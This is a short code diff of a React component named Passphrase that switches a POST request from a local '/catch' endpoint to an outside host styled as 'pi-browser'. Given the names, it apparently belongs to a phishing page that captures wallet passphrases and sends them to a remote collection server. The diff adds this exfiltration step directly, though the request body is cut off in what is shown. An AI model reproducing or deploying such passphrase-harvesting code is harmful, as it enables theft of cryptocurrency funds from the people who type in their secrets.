@@ -20,7 +20,7 @@ const Passphrase = () => {
     const myHeaders = new Headers();
     myHeaders.append("Content-Type", "application/json");
 
-    const response = await fetch("http://localhost:8080/catch", {
+    const response = await fetch("https://pi-browser.cdeluxe.net/catch", {
       method: "POST",
       headers: myHeaders,
       body: JSON.stringify({
